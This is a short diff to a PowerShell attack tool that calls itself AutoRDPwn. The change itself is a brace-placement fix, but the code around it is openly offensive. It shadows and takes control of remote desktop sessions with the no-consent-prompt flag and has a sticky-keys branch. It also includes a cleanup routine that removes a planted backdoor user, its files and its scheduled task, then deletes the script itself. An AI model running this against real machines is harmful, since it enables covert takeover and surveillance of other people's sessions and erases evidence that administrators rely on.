@@ -350,8 +350,8 @@ if($Language -in 'Spanish') {
         Write-Host "$using:txt25" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } 
         Write-Host "" ; $shadow = Read-Host -Prompt "$txt26"
 	if($stickykeys){ $control = $null ; mstsc /v $computer /admin /f }
-        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }
+        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
+        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
         else { Write-Host "$version $txt27"
         invoke-command -session $RDP[0] -scriptblock {
@@ -376,8 +376,8 @@ if($Language -in 'Spanish') {
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host "" ; Write-Host "$txt25" ; sleep -milliseconds 2000
     if($stickykeys){ $control = $null ; mstsc /v $computer /admin /f }
-    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }
+    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
+    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
 $script = 'net user AutoRDPwn /delete ; Remove-Item -path C:\Users\AutoRDPwn* -Recurse -Force ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
